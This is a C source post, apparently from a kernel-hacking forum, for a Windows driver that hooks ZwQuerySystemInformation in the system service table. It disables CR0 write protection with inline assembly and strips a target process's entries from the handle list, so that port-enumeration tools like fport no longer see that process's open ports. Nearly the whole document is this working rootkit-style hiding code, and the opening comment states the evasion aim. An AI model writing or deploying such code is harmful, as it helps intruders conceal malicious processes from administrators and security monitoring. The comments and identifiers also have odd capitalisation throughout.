/*from the fport 's principle,,,it  enumerAte All the hAndles in system by the undocumented function ZwQuerySystemInformAtion,,compAres from \Device\Tcp hAndle's physicAl Address to enumerAted one,then find out which process the hAndle belong to.And DuplicAte the hAndle in current process,mAke A TDI query,,,find out which port is opening

so ,hook the function ZwQuerySystemInformAtion ,chAng the return result without our specified process hAndle in it 

here is the code*/
/////////////////////
////hookservice.h
#include <ntddk.h>
typedef struct _SYSTEM_SERVICE_TABLE
{
 /*000*/ ULONG* ServiceTable;           // array of entry points
 /*004*/ LONG*  CounterTable;           // array of usage counters
 /*008*/ LONG   ServiceLimit;           // number of table entries
 /*00C*/ UCHAR   ArgumentTable;          // array of byte counts
 /*010*/ }
 SYSTEM_SERVICE_TABLE,
  * PSYSTEM_SERVICE_TABLE,
  **PPSYSTEM_SERVICE_TABLE;
 
#define SYSTEM_SERVICE_TABLE_ \
 sizeof (SYSTEM_SERVICE_TABLE)
//--------------------------------------------------------------------
typedef struct _SERVICE_DESCRIPTOR_TABLE
{
 /*000*/ SYSTEM_SERVICE_TABLE ntoskrnl;  // ntoskrnl.exe (native api)
 /*010*/ SYSTEM_SERVICE_TABLE win32k;    // win32k.sys   (gdi/user)
 /*020*/ SYSTEM_SERVICE_TABLE Table3;    // not used
 /*030*/ SYSTEM_SERVICE_TABLE Table4;    // not used
 /*040*/ 
}
 SERVICE_DESCRIPTOR_TABLE,
   * PSERVICE_DESCRIPTOR_TABLE,
   **PPSERVICE_DESCRIPTOR_TABLE;
  
#define SERVICE_DESCRIPTOR_TABLE_ \
        sizeof (SERVICE_DESCRIPTOR_TABLE)

extern PSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable; 


typedef enum _SYSTEM_INFORMATION_CLASS {
 SystemBasicInformation, // 0 Y N
  SystemProcessorInformation, // 1 Y N
  SystemPerformanceInformation, // 2 Y N
  SystemTimeOfDayInformation, // 3 Y N
  SystemNotImplemented1, // 4 Y N
  SystemProcessesAndThreadsInformation, // 5 Y N
  SystemCallCounts, // 6 Y N
  SystemConfigurationInformation, // 7 Y N
  SystemProcessorTimes, // 8 Y N
  SystemGlobalFlag, // 9 Y Y
  SystemNotImplemented2, // 10 Y N
  SystemModuleInformation, // 11 Y N
  SystemLockInformation, // 12 Y N
  SystemNotImplemented3, // 13 Y N
  SystemNotImplemented4, // 14 Y N
  SystemNotImplemented5, // 15 Y N
  SystemHandleInformation, // 16 Y N
  SystemObjectInformation, // 17 Y N
  SystemPagefileInformation, // 18 Y N
  SystemInstructionEmulationCounts, // 19 Y N
  SystemInvalidInfoClass1, // 20
  SystemCacheInformation, // 21 Y Y
  SystemPoolTagInformation, // 22 Y N
  SystemProcessorStatistics, // 23 Y N
  SystemDpcInformation, // 24 Y Y
  SystemNotImplemented6, // 25 Y N
  SystemLoadImage, // 26 N Y
  SystemUnloadImage, // 27 N Y
  SystemTimeAdjustment, // 28 Y Y
  SystemNotImplemented7, // 29 Y N
  SystemNotImplemented8, // 30 Y N
  SystemNotImplemented9, // 31 Y N
  SystemCrashDumpInformation, // 32 Y N
  SystemExceptionInformation, // 33 Y N
  SystemCrashDumpStateInformation, // 34 Y Y/N
  SystemKernelDebuggerInformation, // 35 Y N
  SystemContextSwitchInformation, // 36 Y N
  SystemRegistryQuotaInformation, // 37 Y Y
  SystemLoadAndCallImage, // 38 N Y
  SystemPrioritySeparation, // 39 N Y
  SystemNotImplemented10, // 40 Y N
  SystemNotImplemented11, // 41 Y N
  SystemInvalidInfoClass2, // 42
  SystemInvalidInfoClass3, // 43
  SystemTimeZoneInformation, // 44 Y N
  SystemLookasideInformation, // 45 Y N
  SystemSetTimeSlipEvent, // 46 N Y
  SystemCreateSession, // 47 N Y
  SystemDeleteSession, // 48 N Y
  SystemInvalidInfoClass4, // 49
  SystemRangeStartInformation, // 50 Y N
  SystemVerifierInformation, // 51 Y Y
  SystemAddVerifier, // 52 N Y
  SystemSessionProcessesInformation // 53 Y N
} SYSTEM_INFORMATION_CLASS;
NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
         IN OUT PVOID SystemInformation,
         IN ULONG SystemInformationLength,
         OUT PULONG ReturnLength OPTIONAL
         );

NTSTATUS
NTAPI
myZwQuerySystemInformation(
         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
         IN OUT PVOID SystemInformation,
         IN ULONG SystemInformationLength,
         OUT PULONG ReturnLength OPTIONAL
         );
typedef NTSTATUS (NTAPI *ZWQUERYSYSTEMINFORMATION)(
               IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
               IN OUT PVOID SystemInformation,
               IN ULONG SystemInformationLength,
               OUT PULONG ReturnLength OPTIONAL
               );
NTSTATUS DriverDispAtch(IN PDEVICE_OBJECT DeviceObject,
      IN PIRP Irp);
void DriverUnloAd(IN PDRIVER_OBJECT Driver_object);
//--------------------------------------------------------------------
typedef struct _SYSTEM_HANDLE_INFORMATION {//Information Class 16
 ULONG ProcessId;
 UCHAR ObjectTypeNumber;
 UCHAR Flags;                     //0x01 =PROTECT_FROM_CLOSE,0x02 =INHERIT
 USHORT Handle;
 PVOID Object;
 ACCESS_MASK GrantedAccess;
}SYSTEM_HANDLE_INFORMATION,*PSYSTEM_HANDLE_INFORMATION;



//////////////////////////////
//////hookservice.cpp
#include <ntddk.h>
#include "hookservice.h"
ZWQUERYSYSTEMINFORMATION pOldZwQuerySystemInformAtion;
ULONG TArgetProcessId = 8;      //specify the process ID to hide

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
{
 DriverObject->MajorFunction[IRP_MJ_CREATE] = 
 DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverDispAtch;
 DriverObject->DriverUnload = DriverUnloAd;

 pOldZwQuerySystemInformAtion = (ZWQUERYSYSTEMINFORMATION)(KeServiceDescriptorTable->ntoskrnl.ServiceTable
         [*(PULONG)((PUCHAR)ZwQuerySystemInformation+1)]);

 _asm 
 { 
  CLI //dissable interrupt 
  MOV EAX, CR0 //move CR0 register into EAX 
  AND EAX, NOT 10000H //disable WP bit 
  MOV CR0, EAX //write register back 
 } 
 
 KeServiceDescriptorTable->ntoskrnl.ServiceTable
         [*(PULONG)((PUCHAR)ZwQuerySystemInformation+1)] = (ULONG)myZwQuerySystemInformation;

 
 _asm 
 { 
  MOV EAX, CR0 //move CR0 register into EAX 
  OR EAX, 10000H //enable WP bit 
  MOV CR0, EAX //write register back 
  STI //enable interrupt 
 } 

 
 
 return STATUS_SUCCESS;
}
//--------------------------------------------------------------------
NTSTATUS DriverDispAtch(IN PDEVICE_OBJECT DeviceObject,
      IN PIRP Irp)
{
 Irp->IoStatus.Status = STATUS_SUCCESS;
 IoCompleteRequest(Irp,IO_NO_INCREMENT);
 return STATUS_SUCCESS;
}
//--------------------------------------------------------------------
void DriverUnloAd(IN PDRIVER_OBJECT Driver_object)
{
 _asm 
 { 
  CLI //dissable interrupt 
  MOV EAX, CR0 //move CR0 register into EAX 
  AND EAX, NOT 10000H //disable WP bit 
  MOV CR0, EAX //write register back 
 } 
 
 KeServiceDescriptorTable->ntoskrnl.ServiceTable
         [*(PULONG)((PUCHAR)ZwQuerySystemInformation+1)] = (ULONG)pOldZwQuerySystemInformAtion;
 _asm 
 { 
  MOV EAX, CR0 //move CR0 register into EAX 
  OR EAX, 10000H //enable WP bit 
  MOV CR0, EAX //write register back 
  STI //enable interrupt 
 } 
}
//--------------------------------------------------------------------
NTSTATUS
NTAPI
myZwQuerySystemInformation(
         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
         IN OUT PVOID SystemInformation,
         IN ULONG SystemInformationLength,
         OUT PULONG ReturnLength OPTIONAL
         )
{
 NTSTATUS StAtus;
 StAtus = pOldZwQuerySystemInformAtion(
  SystemInformationClass,
  SystemInformation,
  SystemInformationLength,
  ReturnLength OPTIONAL
  );
 if (SystemInformationClass == SystemHandleInformation){
  if (StAtus == STATUS_SUCCESS){
   int nCount;
   int i;
   PSYSTEM_HANDLE_INFORMATION pProcesses;
   DbgPrint("oh i see it :>\n");//
   nCount = *(PULONG)SystemInformation;
   pProcesses = (PSYSTEM_HANDLE_INFORMATION)((PULONG)SystemInformation + 1);
   for (i = 0;i < nCount;i++){
    if (pProcesses->ProcessId == TArgetProcessId){
     if (i != nCount-1){
      RtlCopyMemory( pProcesses,pProcesses+1,sizeof(SYSTEM_HANDLE_INFORMATION)*(nCount-i-1));
      *(PULONG)SystemInformation = --nCount;
      i--;
      pProcesses --;
     }else{
      *(PULONG)SystemInformation = --nCount;
      i--;
      pProcesses --;
     }
    }
    pProcesses ++;
   }//for
  }//if
 }//if
 return StAtus;
}
//--------------------------------------------------------------------

